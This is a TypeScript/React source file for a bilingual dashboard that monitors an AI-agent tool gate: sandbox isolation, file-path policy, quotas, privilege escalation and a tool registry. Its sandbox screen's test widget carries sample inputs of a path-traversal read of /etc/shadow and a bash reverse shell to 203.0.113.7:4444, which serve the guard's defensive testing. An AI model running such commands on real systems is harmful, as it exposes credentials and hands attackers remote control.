// D3 도구 오남용 상세 화면 — SCR-G02 도구 호출 목록(상세는 /domains/d3/calls/[trace]), SCR-G03 샌드박스·파일 경로, SCR-G04 쿼터·권한 상승·레지스트리.
import Link from "next/link";
import { Fragment } from "react";
import { Chip, VerdictBadge } from "@/components/Badges";
import { Inspector } from "@/components/Inspector";
import { api, safe } from "@/lib/api";
import { fmtTime, shortHash } from "@/lib/format";
import { nm, tr, LX } from "@/lib/i18n";
import { AgentStrip, DetailHeader, Recent, type ScreenProps, SettingsCard } from "./common";

const MECH_EN: Record<string, string> = { L0: "in the API process (pure computation)", L1: "separate process · rlimit · empty env · Landlock · seccomp · audit hook",
  L2: "user-space kernel · microVM (gVisor · Firecracker)", L3: "one-shot microVM · destroyed after snapshot · physically separate node" };

export async function Calls({ lang, d, screen, sp }: ScreenProps) {
  const { data } = await safe(api("/v1/domains/d3/calls?limit=50"), { items: [] as any[] });
  return (
    <>
      <DetailHeader lang={lang} d={d} screen={screen} msg={LX(lang, sp.msg)} />
      <AgentStrip lang={lang} ids={["d3-01", "d3-02"]} />
      <section className="card overflow-hidden text-sm" data-testid="calls">
        <h2 className="p-3 font-semibold">{tr(lang, "최근 도구 관문 판정 — 행을 열면 인자·사전조건·드라이런·명령 주입·근거", "Recent tool-gate verdicts — open a row for args · preconditions · dry run · injection · evidence")}</h2>
        <table className="grid-table text-xs"><thead><tr><th>{tr(lang, "시각", "Time")}</th><th>call</th><th>{tr(lang, "주체(대리)", "Principal (agent)")}</th><th>{tr(lang, "도구", "Tool")}</th><th>{tr(lang, "판정", "Verdict")}</th><th>{tr(lang, "규칙", "Rules")}</th><th>{tr(lang, "승인", "Approval")}</th></tr></thead>
          <tbody>{data.items.length === 0 ? <tr><td colSpan={7} className="text-muted">{tr(lang, "도구 관문 판정 없음", "No tool-gate verdicts")}</td></tr> : data.items.map((c: any) => (
            <tr key={c.traceId}><td>{fmtTime(c.at)}</td><td className="mono"><Link className="text-primary" href={`/domains/d3/calls/${c.traceId}`}>{shortHash(c.traceId)}</Link></td>
              <td>{c.principal ?? "—"}{c.onBehalfOf && ` (${c.onBehalfOf})`}</td><td className="mono">{c.tool ?? "—"}</td><td><VerdictBadge v={c.verdict} /></td>
              <td className="mono">{c.rules.join(", ") || "—"}</td><td>{c.approvalRef ? <Link className="text-primary" href="/approvals">{c.approvalRef}</Link> : "—"}</td></tr>))}</tbody></table>
      </section>
    </>
  );
}

export async function Sandbox({ lang, user, d, screen, sp }: ScreenProps) {
  const { data: x } = await safe(api("/v1/domains/d3/sandbox"), null as any);
  const pools = x?.sandbox?.pools ?? [];
  return (
    <>
      <DetailHeader lang={lang} d={d} screen={screen} msg={LX(lang, sp.msg)} />
      <AgentStrip lang={lang} ids={["d3-03", "d3-04"]} />
      <div className="grid grid-cols-2 gap-4">
        <section className="card space-y-2 p-4 text-sm" data-testid="isolation-profile">
          <h2 className="font-semibold">{tr(lang, "① 워크로드별 격리 프로파일", "① Isolation profile by workload")}</h2>
          <p className="text-xs">{tr(lang, "에이전트 요구 등급 분포", "Required level distribution")}: {Object.entries(x?.levels ?? {}).map(([k, v]) => <Chip key={k}>{k} {String(v)}</Chip>)}</p>
          <table className="grid-table text-xs"><thead><tr><th>{tr(lang, "워크로드(에이전트)", "Workload (agent)")}</th><th>{tr(lang, "요구", "Required")}</th><th>{tr(lang, "실행", "Runs")}</th><th>{tr(lang, "상태", "Status")}</th></tr></thead>
            <tbody>{(x?.workloads ?? []).length === 0 ? <tr><td colSpan={4} className="text-muted">{tr(lang, "L1 이상 요구 에이전트 없음 — 내장 에이전트는 모두 L0(순수 계산)", "No agent requires L1+ — built-ins are all L0 (pure computation)")}</td></tr>
              : x.workloads.map((w: any) => <tr key={w.id}><td>{w.id} {nm(lang, w)}</td><td>{w.required}</td><td style={{ color: w.runnable ? "var(--verdict-allow)" : "var(--verdict-block)" }}>{w.runnable ? w.required : tr(lang, "기동 거부(런타임 없음)", "refused (no runtime)")}</td><td>{w.status}</td></tr>)}</tbody></table>
          <p className="text-xs text-muted">{tr(lang, "요구 등급 미달 실행은 기동 거부(MSG-006) — 격리를 낮추는 강등은 없다. 1회용 샌드박스는 요청 단위 발급·회수, 이그레스 기본 차단(L1 = 일회용 하위 프로세스·rlimit·네트워크 차단·임시 FS).",
            "Running below the required level is refused (MSG-006) — no isolation downgrade. One-shot sandboxes are issued and reclaimed per request; egress denied by default (L1 = disposable subprocess · rlimit · no network · temp FS).")}</p>
        </section>
        <section className="card space-y-2 p-4 text-sm" data-testid="sandbox-pool">
          <h2 className="font-semibold">{tr(lang, "② 샌드박스 풀 (FR-P08)", "② Sandbox pool (FR-P08)")}</h2>
          <table className="grid-table text-xs"><thead><tr><th>{tr(lang, "등급", "Level")}</th><th>{tr(lang, "기제", "Mechanism")}</th><th>{tr(lang, "용량", "Capacity")}</th><th>{tr(lang, "처리", "Served")}</th><th>{tr(lang, "대기", "Queued")}</th><th>{tr(lang, "거부", "Rejected")}</th><th>{tr(lang, "회수", "Recycled")}</th></tr></thead>
            <tbody>{pools.map((p: any) => <tr key={p.level}><td>{p.level}</td><td>{tr(lang, p.mechanism, MECH_EN[p.level] ?? p.mechanism)}</td><td>{p.available ? (p.capacity ?? "∞") : <span style={{ color: "var(--verdict-block)" }}>{tr(lang, "런타임 없음", "no runtime")}</span>}</td><td>{p.served}</td><td>{p.queued}</td><td>{p.rejected}</td><td>{p.recycled}</td></tr>)}</tbody></table>
          <p className="text-xs text-muted">{tr(lang, `재활용 ${x?.sandbox?.recycleUses ?? "—"}회 후 교체 · 대기 ${x?.sandbox?.queueSec ?? "—"}초 초과 시 거부 · 등급 낮춤 강등 없음(ST-10)`, `replaced after ${x?.sandbox?.recycleUses ?? "—"} uses · rejected after ${x?.sandbox?.queueSec ?? "—"} s in queue · never downgraded (ST-10)`)} · <Link className="text-primary" href="/admin/sandbox">{tr(lang, "샌드박스·격리 풀 ›", "Sandbox pools ›")}</Link></p>
          <h3 className="pt-2 font-semibold">{tr(lang, "④ 격리 기제 · 이그레스", "④ Isolation mechanisms · egress")}</h3>
          <dl className="grid grid-cols-[150px_1fr] gap-y-1 text-xs">{Object.entries(x?.sandbox?.capabilities ?? {}).map(([k, v]) => <Fragment key={k}><dt className="text-muted">{k}</dt><dd>{typeof v === "object" ? JSON.stringify(v) : String(v)}</dd></Fragment>)}</dl>
        </section>
      </div>
      <div className="mt-4 grid grid-cols-2 gap-4">
        <div className="space-y-4">
          <SettingsCard lang={lang} user={user} id="d3-04" title={tr(lang, "③ 파일 경로 정책 (AG-D3-04) — 허용 루트 · 읽기 전용 마운트", "③ File-path policy (AG-D3-04) — allowed roots · read-only mounts")} />
          <section className="card p-4 text-sm">
            <h2 className="mb-2 font-semibold">{tr(lang, "경로 정규화 시험 (저장 안 함)", "Path normalization test (no save)")}</h2>
            <Inspector agents={[{ id: "d3-04", label: "d3-04" }, { id: "d3-03", label: "d3-03" }]} samples={{
              "d3-04": { tool: { name: "read_file", args: { path: "../../etc/shadow" } } },
              "d3-03": { tool: { name: "run_shell", args: { cmd: "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1" } } } }} />
          </section>
        </div>
        <section className="card overflow-hidden text-sm" data-testid="sandbox-events">
          <h2 className="p-3 font-semibold">{tr(lang, "경고 이벤트 — 시스템 장악·파일 조작 (7일)", "Alert events — system compromise · file manipulation (7 days)")}</h2>
          <table className="grid-table text-xs"><thead><tr><th>{tr(lang, "시각", "Time")}</th><th>{tr(lang, "주체", "Principal")}</th><th>{tr(lang, "규칙", "Rule")}</th><th>{tr(lang, "판정", "Verdict")}</th><th>{tr(lang, "근거", "Evidence")}</th></tr></thead>
            <tbody>{(x?.events ?? []).length === 0 ? <tr><td colSpan={5} className="text-muted">{tr(lang, "없음", "None")}</td></tr> : x.events.map((e: any) => (
              <tr key={e.id}><td>{fmtTime(e.at)}</td><td>{e.principal ?? "—"}</td><td className="mono"><Link className="text-primary" href={`/domains/d3/calls/${e.traceId}`}>{e.ruleId}</Link></td><td><VerdictBadge v={e.effective ?? e.verdict} /></td><td>{e.evidence.map((v: any) => LX(lang, v.note)).join("; ")}</td></tr>))}</tbody></table>
        </section>
      </div>
    </>
  );
}

export async function Registry({ lang, user, d, screen, sp }: ScreenProps) {
  const { data: x } = await safe(api("/v1/domains/d3/registry"), null as any);
  if (!x) return <DetailHeader lang={lang} d={d} screen={screen} msg={LX(lang, sp.msg)} />;
  const ST: Record<string, [string, string, string]> = { ok: ["정상", "OK", "var(--verdict-allow)"], near: ["근접", "Near", "#e2b007"], over: ["초과 → 차단", "Over → block", "var(--verdict-block)"] };
  return (
    <>
      <DetailHeader lang={lang} d={d} screen={screen} msg={LX(lang, sp.msg)} />
      <AgentStrip lang={lang} ids={["d3-05", "d3-06", "d3-07"]} />
      <section className="card overflow-hidden text-sm" data-testid="quota-table">
        <h2 className="p-3 font-semibold">{tr(lang, "① 주체별 레이트 · 쿼터 (AG-D3-05) — 도구 관문 관측", "① Rate · quota by principal (AG-D3-05) — observed at the tool gate")}</h2>
        <table className="grid-table text-xs"><thead><tr><th>{tr(lang, "주체", "Principal")}</th><th>{tr(lang, "1시간", "1 h")}</th><th>{tr(lang, "오늘 / 일 쿼터", "Today / daily quota")}</th><th>{tr(lang, "동시성", "Concurrency")}</th><th>{tr(lang, "차단", "Blocked")}</th><th>{tr(lang, "상태", "State")}</th></tr></thead>
          <tbody>{x.usage.length === 0 ? <tr><td colSpan={6} className="text-muted">{tr(lang, "관측 없음", "No observations")}</td></tr> : x.usage.map((u: any) => {
            const [ko, en, c] = ST[u.state]; return (
              <tr key={u.principal}><td>{u.principal}</td><td>{u.hour}{u.quota?.perHour ? ` / ${u.quota.perHour}` : ""}</td><td>{u.day} / {u.quota?.perDay ?? "—"}</td><td>{u.quota?.concurrency ?? "—"}</td><td>{u.blocked}</td><td style={{ color: c }}>{tr(lang, ko, en)}</td></tr>); })}</tbody></table>
        <p className="p-3 text-xs text-muted">{tr(lang, "집행은 API 게이트웨이(Kong·Envoy·APISIX)가 recentCalls·usageToday 를 실어 보낼 때 d3-05 가 판정 — 플랫폼은 관문 기록으로 관측해 쿼터와 대조한다. 비용 관측 →", "Enforcement: when the API gateway (Kong · Envoy · APISIX) sends recentCalls · usageToday, d3-05 judges — the platform observes gate records against quotas. Cost →")} <Link className="text-primary" href="/gates/tool">{tr(lang, "관문 비용·SLO", "gate cost · SLO")}</Link></p>
      </section>
      <div className="mt-4 grid grid-cols-2 gap-4">
        <section className="card space-y-2 p-4 text-sm" data-testid="escalation">
          <h2 className="font-semibold">{tr(lang, "② 권한 상승 — 다운스코핑 · 정적 경로 분석 (AG-D3-06)", "② Privilege escalation — downscoping · static path analysis (AG-D3-06)")}</h2>
          <p className="text-xs text-muted">{tr(lang, "대리 실행은 사람·에이전트 권한의 교집합만(혼동된 대리인 방지) — 도구 요구 범위가 그 밖이면 차단. 아래는 허용목록·등록 도구 이름 조합으로 본 잠재 경로.", "Delegated calls get only the intersection of human and agent scopes (confused-deputy guard) — tools needing more are blocked. Below: potential paths from allowlisted/registered tool names.")}</p>
          <table className="grid-table text-xs"><thead><tr><th>{tr(lang, "경로", "Path")}</th><th>{tr(lang, "위험", "Risk")}</th><th>{tr(lang, "이유", "Why")}</th><th>{tr(lang, "차단 규칙", "Blocked")}</th></tr></thead>
            <tbody>{x.escalation.length === 0 ? <tr><td colSpan={4} className="text-muted">{tr(lang, "잠재 경로 없음 (도구 목록 기준)", "No potential paths (from the tool list)")}</td></tr> : x.escalation.map((e: any) => (
              <tr key={e.from + e.to}><td className="mono">{e.from} → {e.to}</td><td style={{ color: e.risk === "high" ? "var(--verdict-block)" : "#9d6105" }}>{e.risk}</td><td>{tr(lang, e.why, e.why === "권한 변경 도구" ? "permission-changing tool" : "secret-access tool")}</td><td>{e.blocked ? "✓" : "—"}</td></tr>))}</tbody></table>
          <p className="text-xs">{tr(lang, "경로 차단 = 아래 d3-06 blockedChains 에 'a->b' 추가 → 시험 → 배포", "Block a path = add 'a->b' to d3-06 blockedChains below → test → deploy")}</p>
          <ul className="text-xs">{x.scopeFindings.slice(0, 6).map((f: any) => <li key={f.id}><VerdictBadge v={f.effective ?? f.verdict} /> <Link className="text-primary mono" href={`/domains/d3/calls/${f.traceId}`}>{f.ruleId}</Link> {f.principal}{f.onBehalfOf && ` (${f.onBehalfOf})`} · {f.evidence.map((e: any) => LX(lang, e.note)).join("; ")}</li>)}</ul>
        </section>
        <section className="card space-y-2 p-4 text-sm" data-testid="tool-registry">
          <h2 className="font-semibold">{tr(lang, "③ 도구 레지스트리 (AG-D3-07) — 출처·해시·격리", "③ Tool registry (AG-D3-07) — source · hash · quarantine")}</h2>
          <table className="grid-table text-xs"><thead><tr><th>{tr(lang, "도구·서버", "Tool / server")}</th><th>{tr(lang, "종류", "Kind")}</th><th>{tr(lang, "해시 고정", "Pinned hash")}</th><th>{tr(lang, "최근 점검", "Last scan")}</th><th>{tr(lang, "허용목록", "Allowlist")}</th><th>{tr(lang, "상태", "State")}</th></tr></thead>
            <tbody>{x.tools.length === 0 && !x.allowlist ? <tr><td colSpan={6} className="text-muted">{tr(lang, "등록 도구 없음", "No registered tools")}</td></tr> : x.tools.map((t: any) => (
              <tr key={t.kind + t.name}><td className="mono">{t.name}</td><td>{t.kind}</td><td>{t.pinned ? "✓" : "—"}</td><td>{t.lastVerdict ? <VerdictBadge v={t.lastVerdict} /> : "—"}</td><td>{t.allowlisted == null ? "—" : t.allowlisted ? "✓" : "✗"}</td>
                <td style={{ color: t.quarantined ? "var(--verdict-block)" : "var(--verdict-allow)" }}>{t.quarantined ? tr(lang, "격리(차단)", "quarantined (blocked)") : tr(lang, "허용", "allowed")}</td></tr>))}</tbody></table>
          <p className="text-xs">{tr(lang, "허용목록", "Allowlist")}: {x.allowlist ? x.allowlist.map((n: string) => <Chip key={n}>{n}</Chip>) : tr(lang, "미설정(제한 없음)", "unset (no limit)")}</p>
          <p className="text-xs text-muted">{tr(lang, "미등록 도구 = 실행 거부(허용목록 설정 시). 런타임 해시 불일치 → 상시 점검이 격리 목록에 올려 관문이 즉시 차단·사건(MSG-005). 설치 전 정적 스캔 →", "Unregistered tool = refused (when an allowlist is set). Runtime hash mismatch → continuous scan quarantines it, the gate blocks at once and opens an incident (MSG-005). Pre-install static scan →")} <Link className="text-primary" href="/scan">{tr(lang, "상시 점검·격리", "Continuous scan")}</Link> · <Link className="text-primary" href="/marketplace">{tr(lang, "도구 등록(장터)", "Register tool (marketplace)")}</Link></p>
          <ul className="text-xs">{x.unregistered.slice(0, 5).map((f: any) => <li key={f.id}><VerdictBadge v={f.effective ?? f.verdict} /> <Link className="text-primary mono" href={`/domains/d3/calls/${f.traceId}`}>{f.ruleId}</Link> · {f.evidence.map((e: any) => LX(lang, e.note)).join("; ")}</li>)}</ul>
        </section>
      </div>
      <div className="mt-4 grid grid-cols-3 gap-4">
        <SettingsCard lang={lang} user={user} id="d3-05" title={tr(lang, "d3-05 — 레이트·쿼터", "d3-05 — rate · quota")} />
        <SettingsCard lang={lang} user={user} id="d3-06" title={tr(lang, "d3-06 — 차단 경로", "d3-06 — blocked chains")} />
        <SettingsCard lang={lang} user={user} id="d3-07" title={tr(lang, "d3-07 — 도구 허용목록", "d3-07 — tool allowlist")} />
      </div>
      <div className="mt-4"><Recent lang={lang} ids={["d3-05", "d3-06", "d3-07"]} /></div>
    </>
  );
}
